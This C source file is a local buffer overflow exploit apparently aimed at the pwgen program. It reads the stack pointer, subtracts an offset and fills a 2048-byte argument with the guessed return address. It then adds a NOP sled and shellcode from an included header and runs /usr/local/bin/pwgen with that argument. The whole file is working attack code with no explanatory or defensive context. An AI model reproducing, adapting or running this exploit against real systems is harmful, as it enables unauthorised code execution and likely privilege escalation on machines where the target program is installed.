#include <stdlib.h>
#include "shellcode.h"

#define DEFAULT_OFFSET                 3664
#define NOP                            0x90

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[]) {
  char *filename, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=2048;
  int i;
  char *arg[3];

  if (argc > 1) offset  = atoi(argv[1]);

  if (!(filename = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("SP: 0x%x\n", get_sp());
  printf("Using address: 0x%x\n", addr);
  

  ptr = filename;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  filename[0] = '-';
  filename[1] = 'e';

  for (i = 2; i < bsize/4; i++)
    filename[i] = NOP;
  
  ptr = filename + (bsize/4) - strlen(shellcode);
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];
  
  arg[0] = "/usr/local/bin/pwgen";
  arg[1] = filename;
  arg[2] = NULL;

  execve(arg[0], arg, NULL);
  return 0;
}
